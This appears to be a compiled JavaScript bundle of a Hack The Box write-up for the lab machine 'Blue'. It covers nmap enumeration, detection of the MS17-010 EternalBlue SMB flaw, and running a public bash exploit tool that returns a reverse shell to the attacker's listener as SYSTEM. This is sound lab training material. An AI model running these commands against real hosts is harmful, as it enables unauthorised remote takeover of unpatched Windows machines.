"use strict";(self.webpackChunkmy_writeups=self.webpackChunkmy_writeups||[]).push([[8526],{8070:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>u,frontMatter:()=>a,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"HackTheBox/blue","title":"Blue","description":"Enumeration","source":"@site/writeups/HackTheBox/blue.md","sourceDirName":"HackTheBox","slug":"/HackTheBox/blue","permalink":"/writeups/HackTheBox/blue","draft":false,"unlisted":false,"editUrl":"https://github.com/xffsec/xffsec.github.io/tree/main/writeups/HackTheBox/blue.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialsSidebar","previous":{"title":"Bastard","permalink":"/writeups/HackTheBox/bastard"},"next":{"title":"Buff","permalink":"/writeups/HackTheBox/buff"}}');var r=t(4848),o=t(8453);const a={},i="Blue",c={},l=[{value:"Enumeration",id:"enumeration",level:2},{value:"shell as nt authority/system",id:"shell-as-nt-authoritysystem",level:2}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"blue",children:"Blue"})}),"\n",(0,r.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,r.jsx)(n.p,{children:"Start with an nmap scan that will output every open port in grep format to the archive allPorts"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.10.40 -vvv -oG allPorts\n"})}),"\n",(0,r.jsx)(n.p,{children:"After doing that I use a function named xps to extract the ports and run a command that will enumerate all the versions and scripts of each port"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ xps allPorts\n[+] command copied to clipboard, run:\nsudo nmap -sVC -p135,139,445,49152,49153,49154,49155,49156,49157 --min-rate=5000 -n -Pn 10.10.10.40 -oN targeted\n"})}),"\n",(0,r.jsx)(n.p,{children:'I modified the output to only scan those related to smb and enumerate the scripts with "vuln and safe" categories'}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'$ sudo nmap -sVC --script="vuln and safe" -p135,139,445 --min-rate=5000 -n -Pn 10.10.10.40 -oN targeted\n'})}),"\n",(0,r.jsx)(n.p,{children:"The scan shows that the machine is vulnerable to eternal-blue ms17-010"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:"PORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n"})}),"\n",(0,r.jsx)(n.h2,{id:"shell-as-nt-authoritysystem",children:"shell as nt authority/system"}),"\n",(0,r.jsxs)(n.p,{children:["To exploit this vulnerability I use a bash script I made that will automate all the process ",(0,r.jsx)(n.a,{href:"https://github.com/sentreysec/bluepwn-ms17-010",children:"bluepwn-ms17-010"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ git clone https://github.com/sentreysec/bluepwn-ms17-010\n$ cd bluepwn-ms17-010\n$ ./bluepwn.sh\n"})}),"\n",(0,r.jsx)(n.p,{children:"the process is the following first I retrieve the information of the target with the objective to know its architecture, in this case I have a x64 windows 7 machine"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:"Choose an option\n[1] Get Target information\n[2] Run exploit\n[0] Exit\n[>] 1\n[?] IP of the target: 10.10.10.40\nSMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)\n[?] Would you like to go back?\n[Y/n] y\n"})}),"\n",(0,r.jsx)(n.p,{children:"Then I run the exploit setting up the correct parameters such as ip address port and architecture"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:"Choose an option\n[1] Get Target information\n[2] Run exploit\n[0] Exit\n[>] 2\n[?] Target IP: 10.10.10.40\n[?] Your IP: 10.10.14.13\n[?] Your Port: 9001\n[?] Architecture of the host\n\t[1] x86\n\t[2] x64\n[>] 2\n"})}),"\n",(0,r.jsx)(n.p,{children:"The tool automatically retries the exploit in order to make it work, finally after some retries it spawns a shell as nt authority\\system"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"[!] Retrying...\nIf the issue persists is probably that the target machine got rebooted\nlistening on [any] 9001 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.10.40] 49158\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n"})})]})}function u(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>i});var s=t(6540);const r={},o=s.createContext(r);function a(e){const n=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);